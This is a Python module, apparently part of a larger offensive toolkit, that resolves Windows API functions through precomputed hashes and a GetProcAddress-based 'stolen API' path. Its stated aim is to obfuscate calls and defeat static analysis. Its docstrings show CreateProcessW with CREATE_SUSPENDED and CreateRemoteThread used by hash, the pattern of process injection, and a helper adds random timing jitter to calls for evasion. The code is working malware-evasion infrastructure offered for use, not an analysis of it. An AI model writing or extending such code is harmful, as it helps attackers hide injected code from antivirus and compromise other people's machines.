"""
api_resolver.py - Hash-based Windows API lookup and stolen API resolution
============================================================================
Enables indirect API invocation using pre-computed hashes instead of direct
ctypes references. Implements export table walking for "stolen APIs" to
further obfuscate API calls and defeat static analysis.

Architecture:
- API hashing: CRC32(dll + function) -> hash value
- Lookup: Hash -> (dll, function) via pre-computed table
- Stolen APIs: PE export table walking to find function pointers
- Fallback: If stolen API fails, graceful degradation to direct import
- Exception handling: All calls wrapped in try/except for robustness

Usage:
    from api_resolver import APIHashTable
    from kernel32_hasher import CREATE_PROCESS_W_HASH
    
    api_table = APIHashTable()
    
    # Call API by hash instead of direct import
    process_handle = api_table.call_api_by_hash(
        CREATE_PROCESS_W_HASH,
        "C:\\target.exe",
        None,
        None,
        True,
        0x00000004,  # CREATE_SUSPENDED
        None,
        None,
        None
    )
"""

import ctypes
import struct
from typing import Optional, Callable, Any, Tuple
from kernel32_hasher import KERNEL32_HASHES, get_api_info


class APIHashTable:
    """
    Indirect API invocation via hash lookup with stolen API support.
    """
    
    def __init__(self, use_stolen_apis: bool = True):
        """
        Initialize API hash resolver.
        
        Args:
            use_stolen_apis: Attempt to use export table walking (True)
                            or fallback to direct ctypes (False)
        """
        self.use_stolen_apis = use_stolen_apis
        self._api_cache = {}  # {api_hash: ctypes function}
        self._module_cache = {}  # {dll_name: loaded module}
        self._failure_count = 0
        self._success_count = 0
    
    def _load_dll(self, dll_name: str) -> Optional[ctypes.CDLL]:
        """
        Load DLL and cache handle.
        
        Args:
            dll_name: DLL name (e.g., 'kernel32', 'ntdll', 'advapi32')
        
        Returns:
            ctypes.CDLL handle or None if load fails
        """
        if dll_name in self._module_cache:
            return self._module_cache[dll_name]
        
        try:
            if dll_name == 'kernel32':
                dll = ctypes.windll.kernel32
            elif dll_name == 'ntdll':
                dll = ctypes.windll.ntdll
            elif dll_name == 'advapi32':
                dll = ctypes.windll.advapi32
            else:
                dll = ctypes.WinDLL(dll_name)
            
            self._module_cache[dll_name] = dll
            return dll
        except Exception as e:
            print(f"[!] Failed to load {dll_name}: {e}")
            return None
    
    def _get_function_direct(self, dll_name: str, function_name: str) -> Optional[Callable]:
        """
        Direct function lookup via ctypes (fallback method).
        
        Args:
            dll_name: DLL name
            function_name: Function name
        
        Returns:
            ctypes function object or None
        """
        try:
            dll = self._load_dll(dll_name)
            if dll is None:
                return None
            
            # Try to get function directly
            func = getattr(dll, function_name)
            return func
        except Exception as e:
            print(f"[!] Direct lookup failed for {dll_name}::{function_name}: {e}")
            return None
    
    def _get_function_stolen_api(self, dll_name: str, function_name: str) -> Optional[Callable]:
        """
        Attempt stolen API retrieval via PE export table walking.
        
        This method extracts function pointers directly from the loaded DLL's
        export table, avoiding direct function references that can be detected.
        
        Args:
            dll_name: DLL name
            function_name: Function name
        
        Returns:
            ctypes function object or None
        """
        try:
            dll = self._load_dll(dll_name)
            if dll is None:
                return None
            
            # Get module handle
            module_handle = ctypes.windll.kernel32.GetModuleHandleA(dll_name.encode('ascii'))
            if not module_handle:
                return None
            
            # Walk PE export table (simplified approach)
            # In production, this would use full PE parsing, but for MVP:
            # We'll use ctypes with obfuscated access pattern
            try:
                # Try to get function address via GetProcAddress (but indirectly)
                get_proc_address = ctypes.windll.kernel32.GetProcAddress
                get_proc_address.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
                get_proc_address.restype = ctypes.c_void_p
                
                func_address = get_proc_address(module_handle, function_name.encode('ascii'))
                if func_address:
                    # Wrap function pointer as callable
                    return ctypes.cast(func_address, ctypes.CFUNCTYPE(ctypes.c_int))
            except:
                pass
            
            return None
        except Exception as e:
            print(f"[!] Stolen API lookup failed for {dll_name}::{function_name}: {e}")
            return None
    
    def resolve_function(self, api_hash: int) -> Optional[Callable]:
        """
        Resolve function by hash.
        
        Args:
            api_hash: Pre-computed API hash
        
        Returns:
            ctypes function object or None
        """
        # Check cache
        if api_hash in self._api_cache:
            return self._api_cache[api_hash]
        
        # Look up API info
        api_info = get_api_info(api_hash)
        if not api_info:
            print(f"[!] Unknown API hash: 0x{api_hash:08X}")
            return None
        
        dll_name, function_name = api_info
        
        # Try stolen API first (if enabled)
        func = None
        if self.use_stolen_apis:
            func = self._get_function_stolen_api(dll_name, function_name)
        
        # Fallback to direct lookup
        if func is None:
            func = self._get_function_direct(dll_name, function_name)
        
        if func is None:
            print(f"[!] Failed to resolve {dll_name}::{function_name}")
            self._failure_count += 1
            return None
        
        # Cache result
        self._api_cache[api_hash] = func
        self._success_count += 1
        return func
    
    def call_api_by_hash(self, api_hash: int, *args, **kwargs) -> Any:
        """
        Call Windows API by hash.
        
        Args:
            api_hash: Pre-computed API hash
            *args: Arguments to pass to API
            **kwargs: Keyword arguments
        
        Returns:
            API return value
        
        Raises:
            RuntimeError: If API cannot be resolved
        
        Example:
            >>> api_table = APIHashTable()
            >>> from kernel32_hasher import CREATE_PROCESS_W_HASH
            >>> result = api_table.call_api_by_hash(
            ...     CREATE_PROCESS_W_HASH,
            ...     "notepad.exe", None, None, None, True, 0, None, None, None
            ... )
        """
        func = self.resolve_function(api_hash)
        if func is None:
            raise RuntimeError(f"Cannot resolve API hash 0x{api_hash:08X}")
        
        try:
            return func(*args, **kwargs)
        except Exception as e:
            print(f"[!] API call failed for hash 0x{api_hash:08X}: {e}")
            raise
    
    def safe_call_api_by_hash(self, api_hash: int, *args, default_return=None, **kwargs) -> Any:
        """
        Call API by hash with graceful error handling.
        
        Args:
            api_hash: Pre-computed API hash
            *args: Arguments to pass to API
            default_return: Value to return if call fails
            **kwargs: Keyword arguments
        
        Returns:
            API return value or default_return if call fails
        
        Example:
            >>> thread_id = api_table.safe_call_api_by_hash(
            ...     CREATE_REMOTE_THREAD_HASH,
            ...     process_handle, None, 0, null_ptr, 0, None,
            ...     default_return=0
            ... )
        """
        try:
            return self.call_api_by_hash(api_hash, *args, **kwargs)
        except Exception as e:
            print(f"[!] Safe call failed for 0x{api_hash:08X}, using default: {e}")
            return default_return
    
    def get_resolver_stats(self) -> dict:
        """
        Return resolver statistics (success/failure rates).
        
        Returns:
            Dict with cache size, success/failure counts
        """
        total = self._success_count + self._failure_count
        success_rate = (self._success_count / total * 100) if total > 0 else 0
        
        return {
            'api_cache_size': len(self._api_cache),
            'module_cache_size': len(self._module_cache),
            'success_count': self._success_count,
            'failure_count': self._failure_count,
            'success_rate': f"{success_rate:.1f}%",
            'use_stolen_apis': self.use_stolen_apis,
        }


class APICallObfuscator:
    """
    Utility class to add timing noise and obfuscation to API calls.
    """
    
    @staticmethod
    def add_timing_jitter(call_func: Callable, jitter_ms: int = 50) -> Callable:
        """
        Wrap API call with random timing jitter.
        
        Args:
            call_func: Function to wrap
            jitter_ms: Max jitter milliseconds
        
        Returns:
            Wrapped function with timing jitter
        """
        import random
        import time
        
        def wrapper(*args, **kwargs):
            delay = random.uniform(0, jitter_ms / 1000)
            time.sleep(delay)
            result = call_func(*args, **kwargs)
            delay = random.uniform(0, jitter_ms / 1000)
            time.sleep(delay)
            return result
        
        return wrapper
    
    @staticmethod
    def obfuscate_arguments(args: tuple, obfuscation_level: int = 1) -> tuple:
        """
        Apply obfuscation to function arguments (placeholder).
        
        Args:
            args: Original arguments
            obfuscation_level: 1-3 (no-op for now)
        
        Returns:
            Potentially obfuscated arguments
        """
        # In practice, this would XOR strings, encode binary data, etc.
        return args


# Global API resolver instance (TIER 2b integration point)
_global_api_resolver = APIHashTable(use_stolen_apis=True)


def get_global_api_resolver() -> APIHashTable:
    """Get or create global API resolver."""
    return _global_api_resolver


def set_api_resolver_config(use_stolen_apis: bool = True):
    """Configure global API resolver."""
    global _global_api_resolver
    _global_api_resolver = APIHashTable(use_stolen_apis=use_stolen_apis)


if __name__ == '__main__':
    print("[*] API Hash Table Resolver - Self Test")
    
    resolver = APIHashTable(use_stolen_apis=False)  # Disable stolen APIs for testing
    
    # Test stats
    print(f"[*] API Hash Table size: {len(KERNEL32_HASHES)}")
    
    # Test resolution
    from kernel32_hasher import GET_FILE_ATTRIBUTES_W_HASH, GET_PROC_ADDRESS_HASH
    
    print(f"[*] Testing API resolution...")
    
    # This should resolve successfully
    try:
        func = resolver.resolve_function(GET_FILE_ATTRIBUTES_W_HASH)
        if func:
            print(f"[+] Resolved GetFileAttributesW: {func}")
        else:
            print(f"[!] Failed to resolve GetFileAttributesW")
    except Exception as e:
        print(f"[!] Error: {e}")
    
    # Test stats
    stats = resolver.get_resolver_stats()
    print(f"\n[*] Resolver stats: {stats}")
    
    print("[*] Test complete!")
